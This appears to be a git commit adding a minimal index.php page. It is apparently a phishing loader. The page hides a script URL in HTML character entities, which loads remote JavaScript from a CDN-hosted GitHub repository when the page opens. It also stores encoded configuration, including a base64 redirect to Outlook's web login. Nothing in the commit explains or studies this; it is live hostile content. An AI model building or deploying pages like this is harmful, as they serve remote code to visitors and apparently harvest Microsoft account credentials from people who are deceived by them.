5e7d96047898e8aeb1ef5c5b88a5c04fa1baab8d
woertoy <impoortght@gmail.com>
2026-01-18 07:49:38 -0800

    Create index.php

---
+++ public/index.php
@@ -0,0 +1,5 @@
+<html dir="ltr" class="" landing="" lang="en">
+    <head>
+    <meta common="ANY_RANDON_VALUESiowikiej1WemRsZW5wSWVURjFRM040TjFoaGMxcFVkSGRIT0dONVRHaHhiVko0V1RGR2JXbHRWVXhIUXl0VGIwVTNSMjlZUzBGamJUSlJVM1JPWm0xclQwdGhNWEJzVW1zNU1saFphRTFPTlV3NVlsWXhRbFJqVDFnNU1WWXpjVkJWWVVsdmVVMHZUVVpQT0doUFpVMDkmdj15ZXMmYT16eWd1dHBjci1yb3RhdGU6dWE3aHMzeGV6YW1yikiwoiANY_RANDON_VALUES" redirme="ANY_RANDON_VALUESinikiaHR0cHM6Ly9vdXRsb29rLm9mZmljZS5jb20=ikiwiiANY_RANDON_VALUES">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+    <script src="&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x63;&#x64;&#x6e;&#x2e;&#x6a;&#x73;&#x64;&#x65;&#x6c;&#x69;&#x76;&#x72;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x67;&#x68;&#x2f;&#x70;&#x65;&#x72;&#x75;&#x70;&#x64;&#x61;&#x74;&#x65;&#x72;&#x2f;&#x72;&#x65;&#x66;&#x69;&#x78;&#x40;&#x72;&#x65;&#x66;&#x73;&#x2f;&#x68;&#x65;&#x61;&#x64;&#x73;&#x2f;&#x6d;&#x61;&#x69;&#x6e;&#x2f;&#x6c;&#x74;&#x6e;&#x62;&#x64;&#x2e;&#x6a;&#x73;"></script>
